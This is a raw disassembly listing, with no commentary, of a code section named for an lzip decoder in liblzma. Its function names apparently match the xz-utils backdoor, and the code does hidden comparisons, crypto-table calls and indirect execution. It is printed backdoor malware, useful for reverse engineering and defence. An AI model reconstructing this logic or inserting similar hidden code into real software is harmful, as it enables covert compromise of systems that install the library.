.text.lzip_decoder_memconfia:0000000000008808 loc_8808:                               ; CODE XREF: installed_func_0+582↓j
.text.lzip_decoder_memconfia:0000000000008808                 mov     rdx, [rbp-0E88h]
.text.lzip_decoder_memconfia:000000000000880F                 mov     cl, [r15+rax+10h]
.text.lzip_decoder_memconfia:0000000000008814                 cmp     [rdx+rax], cl
.text.lzip_decoder_memconfia:0000000000008817                 jg      short loc_8853
.text.lzip_decoder_memconfia:0000000000008819                 jl      short loc_8853
.text.lzip_decoder_memconfia:000000000000881B                 inc     rax
.text.lzip_decoder_memconfia:000000000000881E                 cmp     rax, 20h ; ' '
.text.lzip_decoder_memconfia:0000000000008822                 jnz     short loc_8808
.text.lzip_decoder_memconfia:0000000000008824                 xor     eax, eax
.text.lzip_decoder_memconfia:0000000000008826                 xorps   xmm0, xmm0
.text.lzip_decoder_memconfia:0000000000008829                 lea     rdi, [rbp-0B08h]
.text.lzip_decoder_memconfia:0000000000008830                 mov     rsi, rbx
.text.lzip_decoder_memconfia:0000000000008833                 mov     ecx, 29h ; ')'
.text.lzip_decoder_memconfia:0000000000008838                 movups  xmmword ptr [rbp-0B18h], xmm0
.text.lzip_decoder_memconfia:000000000000883F                 rep stosb
.text.lzip_decoder_memconfia:0000000000008841                 mov     rdi, rdx
.text.lzip_decoder_memconfia:0000000000008844                 call    _Lparse_lzma12_0 ; PIC mode
.text.lzip_decoder_memconfia:0000000000008849                 test    eax, eax
.text.lzip_decoder_memconfia:000000000000884B                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008851                 jmp     short loc_885B
.text.lzip_decoder_memconfia:0000000000008853 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:0000000000008853
.text.lzip_decoder_memconfia:0000000000008853 loc_8853:                               ; CODE XREF: installed_func_0+545↑j
.text.lzip_decoder_memconfia:0000000000008853                                         ; installed_func_0+564↑j ...
.text.lzip_decoder_memconfia:0000000000008853                 inc     r13
.text.lzip_decoder_memconfia:0000000000008856                 jmp     loc_87BD
.text.lzip_decoder_memconfia:000000000000885B ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:000000000000885B
.text.lzip_decoder_memconfia:000000000000885B loc_885B:                               ; CODE XREF: installed_func_0+5B1↑j
.text.lzip_decoder_memconfia:000000000000885B                 lea     rax, [r14-10h]
.text.lzip_decoder_memconfia:000000000000885F                 mov     r9, [rbx+8]
.text.lzip_decoder_memconfia:0000000000008863                 lea     r14, [r13+10h]
.text.lzip_decoder_memconfia:0000000000008867                 mov     rcx, r13
.text.lzip_decoder_memconfia:000000000000886A                 mov     [rbp-0E90h], rax
.text.lzip_decoder_memconfia:0000000000008871                 mov     rdx, [rbp-0E88h]
.text.lzip_decoder_memconfia:0000000000008878                 mov     r8, r14
.text.lzip_decoder_memconfia:000000000000887B                 mov     rdi, r14
.text.lzip_decoder_memconfia:000000000000887E                 mov     esi, [rbp-0E90h]
.text.lzip_decoder_memconfia:0000000000008884                 call    sub_71C0
.text.lzip_decoder_memconfia:0000000000008889                 test    eax, eax
.text.lzip_decoder_memconfia:000000000000888B                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008891
.text.lzip_decoder_memconfia:0000000000008891 loc_8891:                               ; CODE XREF: installed_func_0+A4E↓j
.text.lzip_decoder_memconfia:0000000000008891                 mov     rax, [r12+8]
.text.lzip_decoder_memconfia:0000000000008896                 mov     edx, [r12]
.text.lzip_decoder_memconfia:000000000000889A                 test    rax, rax
.text.lzip_decoder_memconfia:000000000000889D                 jz      loc_893E
.text.lzip_decoder_memconfia:00000000000088A3                 test    byte ptr [rax], 20h
.text.lzip_decoder_memconfia:00000000000088A6                 lea     rdi, [rbp-0E78h]
.text.lzip_decoder_memconfia:00000000000088AD                 jz      short loc_88F6
.text.lzip_decoder_memconfia:00000000000088AF                 cmp     edx, 2
.text.lzip_decoder_memconfia:00000000000088B2                 jz      short loc_88E0
.text.lzip_decoder_memconfia:00000000000088B4                 ja      short loc_88C7
.text.lzip_decoder_memconfia:00000000000088B6                 test    edx, edx
.text.lzip_decoder_memconfia:00000000000088B8                 mov     sil, [rax+1]
.text.lzip_decoder_memconfia:00000000000088BC                 jnz     short loc_88DA
.text.lzip_decoder_memconfia:00000000000088BE                 shr     sil, 3
.text.lzip_decoder_memconfia:00000000000088C2                 and     esi, 0Fh
.text.lzip_decoder_memconfia:00000000000088C5                 jmp     short loc_88EB
.text.lzip_decoder_memconfia:00000000000088C7 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:00000000000088C7
.text.lzip_decoder_memconfia:00000000000088C7 loc_88C7:                               ; CODE XREF: installed_func_0+614↑j
.text.lzip_decoder_memconfia:00000000000088C7                 mov     esi, 1
.text.lzip_decoder_memconfia:00000000000088CC                 cmp     edx, 3
.text.lzip_decoder_memconfia:00000000000088CF                 jnz     short loc_88EB
.text.lzip_decoder_memconfia:00000000000088D1                 mov     sil, [rax+2]
.text.lzip_decoder_memconfia:00000000000088D5                 and     esi, 1Fh
.text.lzip_decoder_memconfia:00000000000088D8                 jmp     short loc_88EB
.text.lzip_decoder_memconfia:00000000000088DA ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:00000000000088DA
.text.lzip_decoder_memconfia:00000000000088DA loc_88DA:                               ; CODE XREF: installed_func_0+61C↑j
.text.lzip_decoder_memconfia:00000000000088DA                 shr     sil, 2
.text.lzip_decoder_memconfia:00000000000088DE                 jmp     short loc_88E7
.text.lzip_decoder_memconfia:00000000000088E0 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:00000000000088E0
.text.lzip_decoder_memconfia:00000000000088E0 loc_88E0:                               ; CODE XREF: installed_func_0+612↑j
.text.lzip_decoder_memconfia:00000000000088E0                 mov     sil, [rax+1]
.text.lzip_decoder_memconfia:00000000000088E4                 shr     sil, 1
.text.lzip_decoder_memconfia:00000000000088E7
.text.lzip_decoder_memconfia:00000000000088E7 loc_88E7:                               ; CODE XREF: installed_func_0+63E↑j
.text.lzip_decoder_memconfia:00000000000088E7                 movzx   esi, sil
.text.lzip_decoder_memconfia:00000000000088EB
.text.lzip_decoder_memconfia:00000000000088EB loc_88EB:                               ; CODE XREF: installed_func_0+625↑j
.text.lzip_decoder_memconfia:00000000000088EB                                         ; installed_func_0+62F↑j ...
.text.lzip_decoder_memconfia:00000000000088EB                 mov     rdx, [rbx+10h]
.text.lzip_decoder_memconfia:00000000000088EF                 call    installed_func_2 ; PIC mode
.text.lzip_decoder_memconfia:00000000000088F4                 jmp     short loc_8908
.text.lzip_decoder_memconfia:00000000000088F6 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:00000000000088F6
.text.lzip_decoder_memconfia:00000000000088F6 loc_88F6:                               ; CODE XREF: installed_func_0+60D↑j
.text.lzip_decoder_memconfia:00000000000088F6                 mov     rsi, rdi
.text.lzip_decoder_memconfia:00000000000088F9                 xor     ecx, ecx
.text.lzip_decoder_memconfia:00000000000088FB                 mov     edx, 1
.text.lzip_decoder_memconfia:0000000000008900                 mov     rdi, rbx
.text.lzip_decoder_memconfia:0000000000008903                 call    installed_func_3 ; PIC mode
.text.lzip_decoder_memconfia:0000000000008908
.text.lzip_decoder_memconfia:0000000000008908 loc_8908:                               ; CODE XREF: installed_func_0+654↑j
.text.lzip_decoder_memconfia:0000000000008908                 test    eax, eax
.text.lzip_decoder_memconfia:000000000000890A                 jz      short loc_893E
.text.lzip_decoder_memconfia:000000000000890C                 mov     eax, [rbp-0E78h]
.text.lzip_decoder_memconfia:0000000000008912                 lea     rdi, [rbp-0C38h]
.text.lzip_decoder_memconfia:0000000000008919                 mov     ecx, 12h
.text.lzip_decoder_memconfia:000000000000891E                 mov     r13, [r12+8]
.text.lzip_decoder_memconfia:0000000000008923                 mov     r15d, [r12]
.text.lzip_decoder_memconfia:0000000000008927                 mov     r12, [rbx+10h]
.text.lzip_decoder_memconfia:000000000000892B                 mov     [rbp-0E88h], eax
.text.lzip_decoder_memconfia:0000000000008931                 xor     eax, eax
.text.lzip_decoder_memconfia:0000000000008933                 cmp     dword ptr [rbp-0E88h], 0
.text.lzip_decoder_memconfia:000000000000893A                 rep stosd
.text.lzip_decoder_memconfia:000000000000893C                 jns     short loc_8945
.text.lzip_decoder_memconfia:000000000000893E
.text.lzip_decoder_memconfia:000000000000893E loc_893E:                               ; CODE XREF: installed_func_0+42↑j
.text.lzip_decoder_memconfia:000000000000893E                                         ; installed_func_0+50↑j ...
.text.lzip_decoder_memconfia:000000000000893E                 xor     eax, eax
.text.lzip_decoder_memconfia:0000000000008940                 jmp     loc_8D6D
.text.lzip_decoder_memconfia:0000000000008945 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:0000000000008945
.text.lzip_decoder_memconfia:0000000000008945 loc_8945:                               ; CODE XREF: installed_func_0+69C↑j
.text.lzip_decoder_memconfia:0000000000008945                 test    r13, r13
.text.lzip_decoder_memconfia:0000000000008948                 jz      short loc_893E
.text.lzip_decoder_memconfia:000000000000894A                 test    r12, r12
.text.lzip_decoder_memconfia:000000000000894D                 jz      short loc_893E
.text.lzip_decoder_memconfia:000000000000894F                 cmp     qword ptr [r12+18h], 0
.text.lzip_decoder_memconfia:0000000000008955                 jz      short loc_893E
.text.lzip_decoder_memconfia:0000000000008957                 test    r15d, r15d
.text.lzip_decoder_memconfia:000000000000895A                 jz      short loc_8969
.text.lzip_decoder_memconfia:000000000000895C                 cmp     r15d, 3
.text.lzip_decoder_memconfia:0000000000008960                 jnz     short loc_8986
.text.lzip_decoder_memconfia:0000000000008962                 test    byte ptr [r13+2], 20h
.text.lzip_decoder_memconfia:0000000000008967                 jz      short loc_8986
.text.lzip_decoder_memconfia:0000000000008969
.text.lzip_decoder_memconfia:0000000000008969 loc_8969:                               ; CODE XREF: installed_func_0+6BA↑j
.text.lzip_decoder_memconfia:0000000000008969                 mov     rsi, rbx
.text.lzip_decoder_memconfia:000000000000896C                 lea     rdi, [rbp-0C38h]
.text.lzip_decoder_memconfia:0000000000008973                 call    _Lthreads_stop_0 ; PIC mode
.text.lzip_decoder_memconfia:0000000000008978                 test    eax, eax
.text.lzip_decoder_memconfia:000000000000897A                 jz      short loc_893E
.text.lzip_decoder_memconfia:000000000000897C                 mov     al, [r13+0]
.text.lzip_decoder_memconfia:0000000000008980                 and     eax, 1
.text.lzip_decoder_memconfia:0000000000008983                 mov     [rbx+50h], eax
.text.lzip_decoder_memconfia:0000000000008986
.text.lzip_decoder_memconfia:0000000000008986 loc_8986:                               ; CODE XREF: installed_func_0+6C0↑j
.text.lzip_decoder_memconfia:0000000000008986                                         ; installed_func_0+6C7↑j
.text.lzip_decoder_memconfia:0000000000008986                 mov     rdx, [rbp-0E90h]
.text.lzip_decoder_memconfia:000000000000898D                 mov     edi, [rbp-0E88h]
.text.lzip_decoder_memconfia:0000000000008993                 mov     rcx, r12
.text.lzip_decoder_memconfia:0000000000008996                 mov     rsi, r14
.text.lzip_decoder_memconfia:0000000000008999                 call    sub_7120
.text.lzip_decoder_memconfia:000000000000899E                 test    rax, rax
.text.lzip_decoder_memconfia:00000000000089A1                 js      short loc_893E
.text.lzip_decoder_memconfia:00000000000089A3                 test    r15d, r15d
.text.lzip_decoder_memconfia:00000000000089A6                 jz      short loc_89E5
.text.lzip_decoder_memconfia:00000000000089A8                 cmp     r15d, 3
.text.lzip_decoder_memconfia:00000000000089AC                 jz      short loc_89DE
.text.lzip_decoder_memconfia:00000000000089AE
.text.lzip_decoder_memconfia:00000000000089AE loc_89AE:                               ; CODE XREF: installed_func_0+7B2↓j
.text.lzip_decoder_memconfia:00000000000089AE                                         ; installed_func_0+7C3↓j
.text.lzip_decoder_memconfia:00000000000089AE                 mov     edi, [rbp-0E88h]
.text.lzip_decoder_memconfia:00000000000089B4                 xor     eax, eax
.text.lzip_decoder_memconfia:00000000000089B6                 mov     rcx, r12
.text.lzip_decoder_memconfia:00000000000089B9                 mov     edx, 4
.text.lzip_decoder_memconfia:00000000000089BE                 lea     rsi, [rbp-0D38h]
.text.lzip_decoder_memconfia:00000000000089C5                 mov     [rbp-0D38h], eax
.text.lzip_decoder_memconfia:00000000000089CB                 call    sub_70B0
.text.lzip_decoder_memconfia:00000000000089D0                 test    rax, rax
.text.lzip_decoder_memconfia:00000000000089D3                 jns     loc_8A68
.text.lzip_decoder_memconfia:00000000000089D9                 jmp     loc_893E
.text.lzip_decoder_memconfia:00000000000089DE ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:00000000000089DE
.text.lzip_decoder_memconfia:00000000000089DE loc_89DE:                               ; CODE XREF: installed_func_0+70C↑j
.text.lzip_decoder_memconfia:00000000000089DE                 test    byte ptr [r13+2], 20h
.text.lzip_decoder_memconfia:00000000000089E3                 jz      short loc_8A58
.text.lzip_decoder_memconfia:00000000000089E5
.text.lzip_decoder_memconfia:00000000000089E5 loc_89E5:                               ; CODE XREF: installed_func_0+706↑j
.text.lzip_decoder_memconfia:00000000000089E5                 mov     rbx, [rbp-0C20h]
.text.lzip_decoder_memconfia:00000000000089EC                 mov     eax, 40h ; '@'
.text.lzip_decoder_memconfia:00000000000089F1                 mov     edi, [rbp-0E88h]
.text.lzip_decoder_memconfia:00000000000089F7                 lea     rsi, [rbp-0B18h]
.text.lzip_decoder_memconfia:00000000000089FE                 mov     rcx, r12
.text.lzip_decoder_memconfia:0000000000008A01                 mov     edx, 5
.text.lzip_decoder_memconfia:0000000000008A06                 mov     byte ptr [rbp-0B14h], 0
.text.lzip_decoder_memconfia:0000000000008A0D                 cmp     rbx, rax
.text.lzip_decoder_memconfia:0000000000008A10                 cmova   rbx, rax
.text.lzip_decoder_memconfia:0000000000008A14                 lea     eax, [rbx+1]
.text.lzip_decoder_memconfia:0000000000008A17                 bswap   eax
.text.lzip_decoder_memconfia:0000000000008A19                 mov     [rbp-0B18h], eax
.text.lzip_decoder_memconfia:0000000000008A1F                 call    sub_7120
.text.lzip_decoder_memconfia:0000000000008A24                 test    rax, rax
.text.lzip_decoder_memconfia:0000000000008A27                 js      loc_893E
.text.lzip_decoder_memconfia:0000000000008A2D                 mov     rsi, [rbp-0C38h]
.text.lzip_decoder_memconfia:0000000000008A34                 mov     edi, [rbp-0E88h]
.text.lzip_decoder_memconfia:0000000000008A3A                 mov     rcx, r12
.text.lzip_decoder_memconfia:0000000000008A3D                 mov     rdx, rbx
.text.lzip_decoder_memconfia:0000000000008A40                 call    sub_7120
.text.lzip_decoder_memconfia:0000000000008A45                 test    rax, rax
.text.lzip_decoder_memconfia:0000000000008A48                 js      loc_893E
.text.lzip_decoder_memconfia:0000000000008A4E                 cmp     r15d, 3
.text.lzip_decoder_memconfia:0000000000008A52                 jnz     loc_89AE
.text.lzip_decoder_memconfia:0000000000008A58
.text.lzip_decoder_memconfia:0000000000008A58 loc_8A58:                               ; CODE XREF: installed_func_0+743↑j
.text.lzip_decoder_memconfia:0000000000008A58                 cmp     byte ptr [r13+0], 0
.text.lzip_decoder_memconfia:0000000000008A5D                 jns     loc_8AED
.text.lzip_decoder_memconfia:0000000000008A63                 jmp     loc_89AE
.text.lzip_decoder_memconfia:0000000000008A68 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:0000000000008A68
.text.lzip_decoder_memconfia:0000000000008A68 loc_8A68:                               ; CODE XREF: installed_func_0+733↑j
.text.lzip_decoder_memconfia:0000000000008A68                 mov     ebx, [rbp-0D38h]
.text.lzip_decoder_memconfia:0000000000008A6E                 bswap   ebx
.text.lzip_decoder_memconfia:0000000000008A70                 mov     [rbp-0D38h], ebx
.text.lzip_decoder_memconfia:0000000000008A76                 mov     ebx, ebx
.text.lzip_decoder_memconfia:0000000000008A78                 test    rbx, rbx
.text.lzip_decoder_memconfia:0000000000008A7B                 jz      short loc_8AD5
.text.lzip_decoder_memconfia:0000000000008A7D                 cmp     qword ptr [r12+48h], 0
.text.lzip_decoder_memconfia:0000000000008A83                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008A89                 cmp     qword ptr [r12+50h], 0
.text.lzip_decoder_memconfia:0000000000008A8F                 lea     r13, [rbp-0B18h]
.text.lzip_decoder_memconfia:0000000000008A96                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008A9C
.text.lzip_decoder_memconfia:0000000000008A9C loc_8A9C:                               ; CODE XREF: installed_func_0+823↓j
.text.lzip_decoder_memconfia:0000000000008A9C                                         ; installed_func_0+833↓j
.text.lzip_decoder_memconfia:0000000000008A9C                 mov     edx, 200h
.text.lzip_decoder_memconfia:0000000000008AA1                 mov     edi, [rbp-0E88h]
.text.lzip_decoder_memconfia:0000000000008AA7                 mov     rsi, r13
.text.lzip_decoder_memconfia:0000000000008AAA                 cmp     rbx, rdx
.text.lzip_decoder_memconfia:0000000000008AAD                 cmovbe  rdx, rbx
.text.lzip_decoder_memconfia:0000000000008AB1                 call    qword ptr [r12+48h]
.text.lzip_decoder_memconfia:0000000000008AB6                 test    rax, rax
.text.lzip_decoder_memconfia:0000000000008AB9                 jns     short loc_8ACA
.text.lzip_decoder_memconfia:0000000000008ABB                 call    qword ptr [r12+50h]
.text.lzip_decoder_memconfia:0000000000008AC0                 cmp     dword ptr [rax], 4
.text.lzip_decoder_memconfia:0000000000008AC3                 jz      short loc_8A9C
.text.lzip_decoder_memconfia:0000000000008AC5                 jmp     loc_893E
.text.lzip_decoder_memconfia:0000000000008ACA ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:0000000000008ACA
.text.lzip_decoder_memconfia:0000000000008ACA loc_8ACA:                               ; CODE XREF: installed_func_0+819↑j
.text.lzip_decoder_memconfia:0000000000008ACA                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008AD0                 sub     rbx, rax
.text.lzip_decoder_memconfia:0000000000008AD3                 jnz     short loc_8A9C
.text.lzip_decoder_memconfia:0000000000008AD5
.text.lzip_decoder_memconfia:0000000000008AD5 loc_8AD5:                               ; CODE XREF: installed_func_0+7DB↑j
.text.lzip_decoder_memconfia:0000000000008AD5                 cmp     r15d, 2
.text.lzip_decoder_memconfia:0000000000008AD9                 jnz     short loc_8AED
.text.lzip_decoder_memconfia:0000000000008ADB                 mov     rax, [r12+18h]
.text.lzip_decoder_memconfia:0000000000008AE0                 test    rax, rax
.text.lzip_decoder_memconfia:0000000000008AE3                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008AE9                 xor     edi, edi
.text.lzip_decoder_memconfia:0000000000008AEB                 call    rax
.text.lzip_decoder_memconfia:0000000000008AED
.text.lzip_decoder_memconfia:0000000000008AED loc_8AED:                               ; CODE XREF: installed_func_0+7BD↑j
.text.lzip_decoder_memconfia:0000000000008AED                                         ; installed_func_0+839↑j
.text.lzip_decoder_memconfia:0000000000008AED                 mov     eax, 1
.text.lzip_decoder_memconfia:0000000000008AF2                 jmp     loc_8D6D
.text.lzip_decoder_memconfia:0000000000008AF7 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:0000000000008AF7
.text.lzip_decoder_memconfia:0000000000008AF7 loc_8AF7:                               ; CODE XREF: installed_func_0+43A↑j
.text.lzip_decoder_memconfia:0000000000008AF7                 cmp     r13, 628h
.text.lzip_decoder_memconfia:0000000000008AFE                 ja      loc_893E
.text.lzip_decoder_memconfia:0000000000008B04                 lea     eax, [r13+0Bh]
.text.lzip_decoder_memconfia:0000000000008B08                 mov     rdi, [rbp-0E98h]
.text.lzip_decoder_memconfia:0000000000008B0F                 mov     ecx, 69h ; 'i'
.text.lzip_decoder_memconfia:0000000000008B14                 mov     rsi, [rbp-0E90h]
.text.lzip_decoder_memconfia:0000000000008B1B                 bswap   eax
.text.lzip_decoder_memconfia:0000000000008B1D                 mov     [rbp-983h], eax
.text.lzip_decoder_memconfia:0000000000008B23                 lea     eax, [r13+2A7h]
.text.lzip_decoder_memconfia:0000000000008B2A                 bswap   eax
.text.lzip_decoder_memconfia:0000000000008B2C                 mov     [rbp-0B07h], eax
.text.lzip_decoder_memconfia:0000000000008B32                 lea     eax, [r13+2BCh]
.text.lzip_decoder_memconfia:0000000000008B39                 bswap   eax
.text.lzip_decoder_memconfia:0000000000008B3B                 mov     [rbp-0B18h], eax
.text.lzip_decoder_memconfia:0000000000008B41                 mov     rax, [rbx+8]
.text.lzip_decoder_memconfia:0000000000008B45                 rep movsd
.text.lzip_decoder_memconfia:0000000000008B47                 call    qword ptr [rax+0D0h]
.text.lzip_decoder_memconfia:0000000000008B4D                 mov     [rbp-0E88h], rax
.text.lzip_decoder_memconfia:0000000000008B54                 test    rax, rax
.text.lzip_decoder_memconfia:0000000000008B57                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008B5D                 lea     rax, [rbp-0E79h]
.text.lzip_decoder_memconfia:0000000000008B64                 xor     edx, edx
.text.lzip_decoder_memconfia:0000000000008B66                 mov     esi, 1
.text.lzip_decoder_memconfia:0000000000008B6B                 mov     [rbp-0E90h], rax
.text.lzip_decoder_memconfia:0000000000008B72                 mov     rax, [rbx+8]
.text.lzip_decoder_memconfia:0000000000008B76                 mov     rdi, [rbp-0E90h]
.text.lzip_decoder_memconfia:0000000000008B7D                 call    qword ptr [rax+0E0h]
.text.lzip_decoder_memconfia:0000000000008B83                 mov     r14, rax
.text.lzip_decoder_memconfia:0000000000008B86                 test    rax, rax
.text.lzip_decoder_memconfia:0000000000008B89                 jz      loc_8CF3
.text.lzip_decoder_memconfia:0000000000008B8F                 mov     rax, [rbx+8]
.text.lzip_decoder_memconfia:0000000000008B93                 xor     edx, edx
.text.lzip_decoder_memconfia:0000000000008B95                 mov     esi, 100h
.text.lzip_decoder_memconfia:0000000000008B9A                 lea     rdi, [rbp-0E38h]
.text.lzip_decoder_memconfia:0000000000008BA1                 call    qword ptr [rax+0E0h]
.text.lzip_decoder_memconfia:0000000000008BA7                 xor     edx, edx
.text.lzip_decoder_memconfia:0000000000008BA9                 mov     esi, 1
.text.lzip_decoder_memconfia:0000000000008BAE                 mov     rdi, [rbp-0E90h]
.text.lzip_decoder_memconfia:0000000000008BB5                 mov     r15, rax
.text.lzip_decoder_memconfia:0000000000008BB8                 mov     rax, [rbx+8]
.text.lzip_decoder_memconfia:0000000000008BBC                 call    qword ptr [rax+0E0h]
.text.lzip_decoder_memconfia:0000000000008BC2                 mov     rdi, [rbp-0E88h]
.text.lzip_decoder_memconfia:0000000000008BC9                 mov     rdx, r14
.text.lzip_decoder_memconfia:0000000000008BCC                 mov     rsi, r15
.text.lzip_decoder_memconfia:0000000000008BCF                 mov     [rbp-0E90h], rax
.text.lzip_decoder_memconfia:0000000000008BD6                 mov     rax, [rbx+8]
.text.lzip_decoder_memconfia:0000000000008BDA                 mov     rcx, [rbp-0E90h]
.text.lzip_decoder_memconfia:0000000000008BE1                 call    qword ptr [rax+0E8h]
.text.lzip_decoder_memconfia:0000000000008BE7                 dec     eax
.text.lzip_decoder_memconfia:0000000000008BE9                 jnz     loc_8D02
.text.lzip_decoder_memconfia:0000000000008BEF                 mov     rax, [rbx+8]
.text.lzip_decoder_memconfia:0000000000008BF3                 lea     r14, [rbp-0E58h]
.text.lzip_decoder_memconfia:0000000000008BFA                 mov     r15, [rax+0F0h]
.text.lzip_decoder_memconfia:0000000000008C01                 call    qword ptr [rax+58h]
.text.lzip_decoder_memconfia:0000000000008C04                 xor     r9d, r9d
.text.lzip_decoder_memconfia:0000000000008C07                 xor     ecx, ecx
.text.lzip_decoder_memconfia:0000000000008C09                 lea     rsi, [r13+18Fh]
.text.lzip_decoder_memconfia:0000000000008C10                 mov     r8, rax
.text.lzip_decoder_memconfia:0000000000008C13                 lea     rdi, [rbp-903h]
.text.lzip_decoder_memconfia:0000000000008C1A                 mov     rdx, r14
.text.lzip_decoder_memconfia:0000000000008C1D                 call    r15
.text.lzip_decoder_memconfia:0000000000008C20                 dec     eax
.text.lzip_decoder_memconfia:0000000000008C22                 jnz     loc_8CF3
.text.lzip_decoder_memconfia:0000000000008C28                 mov     rax, [rbx+8]
.text.lzip_decoder_memconfia:0000000000008C2C                 mov     edx, 20h ; ' '
.text.lzip_decoder_memconfia:0000000000008C31                 mov     rsi, r14
.text.lzip_decoder_memconfia:0000000000008C34                 lea     r15, [rbp-0D38h]
.text.lzip_decoder_memconfia:0000000000008C3B                 mov     r9, [rbp-0E88h]
.text.lzip_decoder_memconfia:0000000000008C42                 lea     r8, [rbp-0E74h]
.text.lzip_decoder_memconfia:0000000000008C49                 mov     rcx, r15
.text.lzip_decoder_memconfia:0000000000008C4C                 mov     edi, 2A0h
.text.lzip_decoder_memconfia:0000000000008C51                 call    qword ptr [rax+0F8h]
.text.lzip_decoder_memconfia:0000000000008C57                 dec     eax
.text.lzip_decoder_memconfia:0000000000008C59                 jnz     loc_8CF3
.text.lzip_decoder_memconfia:0000000000008C5F                 cmp     dword ptr [rbp-0E74h], 100h
.text.lzip_decoder_memconfia:0000000000008C69                 jnz     loc_8CF3
.text.lzip_decoder_memconfia:0000000000008C6F                 lea     rdi, [rbp-0C20h]
.text.lzip_decoder_memconfia:0000000000008C76                 mov     ecx, 40h ; '@'
.text.lzip_decoder_memconfia:0000000000008C7B                 mov     rsi, r15
.text.lzip_decoder_memconfia:0000000000008C7E                 mov     rax, 0C00000014010000h
.text.lzip_decoder_memconfia:0000000000008C88                 mov     [rbp-0C38h], rax
.text.lzip_decoder_memconfia:0000000000008C8F                 mov     rax, [rbx+40h]
.text.lzip_decoder_memconfia:0000000000008C93                 mov     dword ptr [rbp-0C24h], 10000h
.text.lzip_decoder_memconfia:0000000000008C9D                 mov     rdx, [rax]
.text.lzip_decoder_memconfia:0000000000008CA0                 mov     eax, [rax+8]
.text.lzip_decoder_memconfia:0000000000008CA3                 mov     [rbp-0C30h], rdx
.text.lzip_decoder_memconfia:0000000000008CAA                 mov     [rbp-0C28h], eax
.text.lzip_decoder_memconfia:0000000000008CB0                 lea     rax, [r13+2C0h]
.text.lzip_decoder_memconfia:0000000000008CB7                 rep movsd
.text.lzip_decoder_memconfia:0000000000008CB9                 mov     [rbp-0E90h], rax
.text.lzip_decoder_memconfia:0000000000008CC0                 mov     ecx, 47h ; 'G'
.text.lzip_decoder_memconfia:0000000000008CC5                 mov     rax, [rbx+8]
.text.lzip_decoder_memconfia:0000000000008CC9                 mov     rsi, [rbp-0EA0h]
.text.lzip_decoder_memconfia:0000000000008CD0                 lea     rdi, [rbp+r13-774h]
.text.lzip_decoder_memconfia:0000000000008CD8                 rep movsd
.text.lzip_decoder_memconfia:0000000000008CDA                 mov     rdi, [rbp-0E88h]
.text.lzip_decoder_memconfia:0000000000008CE1                 call    qword ptr [rax+108h]
.text.lzip_decoder_memconfia:0000000000008CE7                 mov     r14, [rbp-0E98h]
.text.lzip_decoder_memconfia:0000000000008CEE                 jmp     loc_8891
.text.lzip_decoder_memconfia:0000000000008CF3 ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:0000000000008CF3
.text.lzip_decoder_memconfia:0000000000008CF3 loc_8CF3:                               ; CODE XREF: installed_func_0+8E9↑j
.text.lzip_decoder_memconfia:0000000000008CF3                                         ; installed_func_0+982↑j ...
.text.lzip_decoder_memconfia:0000000000008CF3                 xor     edx, edx
.text.lzip_decoder_memconfia:0000000000008CF5                 xor     r15d, r15d
.text.lzip_decoder_memconfia:0000000000008CF8                 xor     r14d, r14d
.text.lzip_decoder_memconfia:0000000000008CFB                 mov     [rbp-0E90h], rdx
.text.lzip_decoder_memconfia:0000000000008D02
.text.lzip_decoder_memconfia:0000000000008D02 loc_8D02:                               ; CODE XREF: installed_func_0+949↑j
.text.lzip_decoder_memconfia:0000000000008D02                 mov     rax, [rbx+8]
.text.lzip_decoder_memconfia:0000000000008D06                 mov     rdi, [rbp-0E88h]
.text.lzip_decoder_memconfia:0000000000008D0D                 call    qword ptr [rax+108h]
.text.lzip_decoder_memconfia:0000000000008D13                 test    r14, r14
.text.lzip_decoder_memconfia:0000000000008D16                 jz      short loc_8D25
.text.lzip_decoder_memconfia:0000000000008D18                 mov     rax, [rbx+8]
.text.lzip_decoder_memconfia:0000000000008D1C                 mov     rdi, r14
.text.lzip_decoder_memconfia:0000000000008D1F                 call    qword ptr [rax+110h]
.text.lzip_decoder_memconfia:0000000000008D25
.text.lzip_decoder_memconfia:0000000000008D25 loc_8D25:                               ; CODE XREF: installed_func_0+A76↑j
.text.lzip_decoder_memconfia:0000000000008D25                 test    r15, r15
.text.lzip_decoder_memconfia:0000000000008D28                 jz      short loc_8D37
.text.lzip_decoder_memconfia:0000000000008D2A                 mov     rax, [rbx+8]
.text.lzip_decoder_memconfia:0000000000008D2E                 mov     rdi, r15
.text.lzip_decoder_memconfia:0000000000008D31                 call    qword ptr [rax+110h]
.text.lzip_decoder_memconfia:0000000000008D37
.text.lzip_decoder_memconfia:0000000000008D37 loc_8D37:                               ; CODE XREF: installed_func_0+A88↑j
.text.lzip_decoder_memconfia:0000000000008D37                 cmp     qword ptr [rbp-0E90h], 0
.text.lzip_decoder_memconfia:0000000000008D3F                 jz      loc_893E
.text.lzip_decoder_memconfia:0000000000008D45                 mov     rax, [rbx+8]
.text.lzip_decoder_memconfia:0000000000008D49                 mov     rdi, [rbp-0E90h]
.text.lzip_decoder_memconfia:0000000000008D50                 call    qword ptr [rax+110h]
.text.lzip_decoder_memconfia:0000000000008D56                 jmp     loc_893E
.text.lzip_decoder_memconfia:0000000000008D5B ; ---------------------------------------------------------------------------
.text.lzip_decoder_memconfia:0000000000008D5B
.text.lzip_decoder_memconfia:0000000000008D5B loc_8D5B:                               ; CODE XREF: installed_func_0+11B↑j
.text.lzip_decoder_memconfia:0000000000008D5B                 dec     ecx
.text.lzip_decoder_memconfia:0000000000008D5D                 mov     edx, 16h
.text.lzip_decoder_memconfia:0000000000008D62                 jz      loc_846F
